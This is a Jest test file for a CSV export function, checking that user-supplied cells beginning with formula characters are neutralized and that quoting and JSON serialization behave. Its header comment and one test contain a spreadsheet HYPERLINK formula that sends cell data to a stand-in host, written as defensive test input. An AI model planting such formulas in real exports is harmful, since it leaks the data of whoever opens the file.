/**
 * CSV formula-injection neutralization for the GDPR data-export endpoint.
 *
 * The exported rows carry text set by OTHER users — a conversation title
 * (`conversationName`) and other participants' `displayName`. A cell that
 * begins with `=`, `+`, `-`, `@`, tab or CR is interpreted as a formula by
 * Excel / Sheets / LibreOffice when the victim (or a DPO/support agent) opens
 * the file, so a malicious group title such as
 * `=HYPERLINK("https://evil/?"&A1,"open")` executes on open (CWE-1236).
 *
 * `toCsv` MUST neutralize those cells by prefixing a single quote, while
 * preserving the existing structural (comma / quote / newline) quoting.
 *
 * @jest-environment node
 */

import { describe, it, expect } from '@jest/globals';
import { toCsv } from '../../../routes/me/export';

const cell = (raw: string): string => {
  const out = toCsv(['v'], [{ v: raw }]);
  return out.split('\n')[1];
};

describe('toCsv — formula-injection neutralization', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])(
    'prefixes a single quote before a cell starting with %j',
    (lead) => {
      const raw = `${lead}HACK()`;
      const rendered = cell(raw);
      // The dangerous character must no longer be the first char of the cell.
      expect(rendered.startsWith(`"'`) || rendered.startsWith(`'`)).toBe(true);
    }
  );

  it('neutralizes a HYPERLINK formula smuggled through a conversation title', () => {
    const title = '=HYPERLINK("https://evil.example/?"&A1,"open")';
    const out = toCsv(['conversationName'], [{ conversationName: title }]);
    const line = out.split('\n')[1];
    // Structural quoting wraps it (contains a comma + quotes), and the leading
    // '=' is disarmed by the injected single quote right after the opening ".
    expect(line).toContain(`"'=HYPERLINK`);
    expect(line).not.toMatch(/^=/);
  });

  it('leaves a benign value untouched (only the LEADING char triggers)', () => {
    expect(cell('Alice')).toBe('Alice');
    expect(cell('john@doe')).toBe('john@doe'); // '@' is not leading — untouched
    expect(cell('Bonjour')).toBe('Bonjour');
    expect(cell('@handle')).toBe(`'@handle`); // leading '@' — neutralized
  });

  it('still applies structural quoting for commas, quotes and newlines', () => {
    expect(cell('a,b')).toBe('"a,b"');
    expect(cell('say "hi"')).toBe('"say ""hi"""');
    expect(toCsv(['v'], [{ v: 'line1\nline2' }])).toContain('"line1\nline2"');
  });

  it('renders empty/nullish cells as empty strings', () => {
    expect(toCsv(['v'], [{ v: null }]).split('\n')[1]).toBe('');
    expect(toCsv(['v'], [{ v: undefined }]).split('\n')[1]).toBe('');
  });

  it('une cellule qui porte une liste ou un objet (les visites du lien de profil, #19206) se lit en JSON, jamais « [object Object] »', () => {
    const visits = [{ day: '2026-11-16', visits: 3 }, { day: '2026-11-17', visits: 57 }];
    const line = toCsv(['profileLinkVisits'], [{ profileLinkVisits: visits }]).split('\n')[1];
    expect(line).not.toContain('[object Object]');
    expect(JSON.parse(line.slice(1, -1).replace(/""/g, '"'))).toEqual(visits);
  });

  it('une date reste une date lisible, non une liste', () => {
    expect(toCsv(['at'], [{ at: new Date('2026-11-17T00:00:00.000Z') }]).split('\n')[1]).not.toContain('{');
  });
});
